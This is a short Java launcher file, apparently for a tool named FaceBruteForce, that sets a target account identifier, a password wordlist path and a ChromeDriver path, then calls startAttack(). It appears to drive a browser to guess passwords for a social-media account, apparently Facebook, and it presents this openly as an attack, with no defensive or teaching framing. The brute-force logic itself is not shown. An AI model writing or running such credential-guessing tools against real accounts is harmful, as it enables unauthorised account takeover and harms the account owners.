package com.mejidprojects.facebruteforce;

public class GetStarted {

   public static void main (String[] args) {
        FaceBruteForce faceBruteForce = new FaceBruteForce(
                "user.example.15", // username, id, email, number phone
                "D://MyFiles//WordLists//user_15.txt", // wordlist path
                "C://webdrivers//chromedriver.exe" // chromedriver path
        );
        faceBruteForce.startAttack();
    }
}
